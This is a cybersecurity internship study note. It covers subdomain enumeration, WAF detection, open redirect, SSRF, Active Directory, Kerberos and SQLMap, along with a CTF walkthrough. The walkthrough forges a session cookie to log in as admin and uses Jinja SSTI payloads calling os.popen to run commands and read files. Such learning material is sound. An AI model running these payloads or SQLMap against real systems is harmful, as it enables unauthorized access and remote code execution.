
# 🛡️ Day 7: Subdomain Pentesting, SSRF, SSTI CTF, Active Directory, Kerberos, SQLMap

---

## 🌐 Subdomain File Pentesting

Subdomain pentesting is the process of identifying and testing **subdomains** of a main website to discover potential vulnerabilities.

### 🎯 Example:
- `example.com` might have subdomains like:
  - `admin.example.com`
  - `dev.example.com`
  - `test.example.com`

These can expose staging environments, dev servers, or misconfigured apps.

---

## 🔍 Subfinder Tool

**Subfinder** is a fast passive subdomain enumeration tool written in Go. It uses passive online sources to discover subdomains.

### 🔧 Example Command:
```bash
subfinder -d example.com
```

Returns a list of subdomains associated with `example.com`.

![subfinder](https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/subfinder.jpg)

---

## 🧱 WAFW00F (Web Application Firewall Fingerprinting)

**WAFW00F** detects if a domain is protected by a Web Application Firewall (WAF) and identifies its type.

### 🔧 Example:
```bash
wafw00f https://targetsite.com
```
![wafwoof](https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/wafoof.jpg)

This helps penetration testers craft payloads that can bypass specific WAF protections.

---

## 🔁 Open Redirect Vulnerability

Open Redirect occurs when a vulnerable application redirects users to an untrusted site without validation.

### 🧪 Steps to Test:
1. Find redirect parameter (e.g., `?next=`)
2. Modify value to malicious domain: `https://site.com/login?next=http://evil.com`
3. If user gets redirected → vulnerable

### 🛡️ Mitigations:
- Whitelist only internal paths (`/login`, `/dashboard`)
- Reject full URLs as values
- Enforce redirects using IDs or tokens

---

## 🛰️ SSRF (Server-Side Request Forgery)

SSRF allows attackers to send crafted requests from the server itself.

### 🧠 Example:
Input like `http://127.0.0.1:80/admin` forces the backend to query internal services.

### 🛡️ Mitigations:
- Internal request segmentation
- Block internal IP ranges (127.0.0.0/8, 169.254.0.0/16)
- Use allow-lists for URLs
- Disable unused protocols (e.g., `file://`)

---

## 🎯 SSTI CTF Walkthrough

### 🔐 Phase 1: Cookie Manipulation (Bypassing Login)
```bash
echo "eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6ImFsaWNlIn0=" | base64 -d
# Output: {"user_id":3,"username":"alice"}
```
![ctf-1](https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/Screenshot%202025-07-15%20192024.png)

Change to admin:
```json
{"user_id":1,"username":"admin"}
```
![ctf-2](https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/Screenshot%202025-07-15%20192050.png)

Re-encode and inject via:
```js
document.cookie = "session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0=";
```

✅ You’re now logged in as admin.

---

### 🎭 Phase 2: Discovering SSTI
Form input: `{{7*7}}`  
Output: `Happy New Year 2025, 49!` ✅ Confirmed SSTI.

![ctf-3](https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/ctf-7.png)

---

### 💥 Phase 3: Exploiting SSTI to Achieve RCE

```jinja
{{ cycler.__init__.__globals__.os.popen('ls /home').read() }}
{{ cycler.__init__.__globals__.os.popen('cat /home/deadly-agent/ctfs/new1/captcha/flag.txt').read() }}
```

✅ Extracted flag:  
```
flag{congrats_you_pwned_the_ssti_and_cookie_auth}
```

---

## 🏢 Active Directory (AD)

AD is a Microsoft service that manages **users, computers, policies, and resources** in a centralized domain.

### 📦 Components:
- **Domain** – Central unit of AD
- **OU (Organizational Unit)** – Containers within domains
- **Users** – Accounts with access privileges
- **Groups** – User collections
- **Computers** – Endpoints
- **DC (Domain Controller)** – Auth server
- **Forest/Tree** – Hierarchy of domains

---

## 🔐 Authentication in AD

- **LDAP** for directory access
- **NTLM** and **Kerberos** for authentication
- Supports single sign-on (SSO)
- Users authenticate against the **Domain Controller (DC)**

---

## 🔑 Kerberos Authentication Process

1. **User requests Ticket Granting Ticket (TGT)** from **KDC (Key Distribution Center)**.
2. KDC verifies and issues TGT encrypted with user key.
3. User presents TGT to get **Service Ticket**.
4. Access granted to the service.

> Kerberos uses symmetric key cryptography and timestamps.

---

## 💉 SQLMap – SQL Injection Automation

**SQLMap** automates SQL injection detection and exploitation.

### 🔧 Usage:
```bash
sqlmap -u "http://site.com/login?user=1" --dbs
sqlmap -r request.txt --batch
```

### ✅ Features:
- Supports MySQL, MSSQL, Oracle, PostgreSQL, etc.
- Detects and exploits:
  - Boolean-based
  - Error-based
  - Time-based
  - UNION query

---

## 📚 Bonus Resource: PayloadAllTheThings

GitHub repo filled with:
- Payloads for XSS, SQLi, LFI, SSTI
- Wordlists and bypass tricks
- Real-world exploitation tips

🔗 https://github.com/swisskyrepo/PayloadsAllTheThings

---
